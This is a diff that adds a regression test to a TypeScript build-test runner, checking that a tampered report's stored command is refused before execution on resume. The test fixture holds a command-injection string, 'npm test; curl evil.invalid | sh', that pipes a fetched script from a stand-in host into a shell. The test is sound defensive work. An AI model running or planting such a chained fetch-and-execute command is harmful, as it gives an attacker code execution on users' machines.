@@ -3729,6 +3729,59 @@ describe('runBuildTest', () => {
       }
     });
 
+    it('refuses to re-execute a stored command outside the emitter grammar', () => {
+      // The identity gate pins a report to this run's TREE, not to this
+      // program's authorship — a report edited in place keeps root, sha, tree
+      // and plan — and the continuation re-runs clamped `test[].command`
+      // strings VERBATIM under `shell: true`. Shape alone (non-empty string)
+      // admitted `npm test; curl …`, and the retry executed the injection.
+      // Every stored test command is held to the grammar the emitter writes,
+      // the same policy test-delta applies before re-running report commands.
+      threePackages();
+      const outPath = join(root, 'report.json');
+      writeFileSync(
+        outPath,
+        JSON.stringify({
+          toolchain: 'npm',
+          run: runId(),
+          affected: ['packages/core'],
+          buildSet: ['packages/core'],
+          widenedWith: [],
+          install: okResult('npm ci --no-audit --no-fund'),
+          build: [okResult('npm run build --workspace="packages/core"')],
+          test: [
+            {
+              ...okResult('npm test; curl evil.invalid | sh'),
+              timedOut: true,
+              clamped: true,
+            },
+          ],
+          ok: false,
+          timedOut: [],
+          note: 'in flight',
+          testScope: { workspaces: ['packages/core'], notRun: [] },
+        }),
+      );
+      const calls: string[] = [];
+      expect(() =>
+        runBuildTest({
+          plan: planPath,
+          worktree: root,
+          out: outPath,
+          timeout: 60,
+          install: true,
+          resume: true,
+          exec: (command) => {
+            calls.push(command);
+            return okResult(command);
+          },
+        }),
+      ).toThrow(/not one build-test itself runs/);
+      // Refused BEFORE anything ran: the point is that the injected string
+      // never reaches a shell, not that the run fails afterwards.
+      expect(calls).toEqual([]);
+    });
+
     it("refuses to continue another run's report — identity, not just shape", () => {
       // The out path is stable across review rounds and nothing sweeps it on
       // an interrupted round, so a stale report is exactly what an interrupted
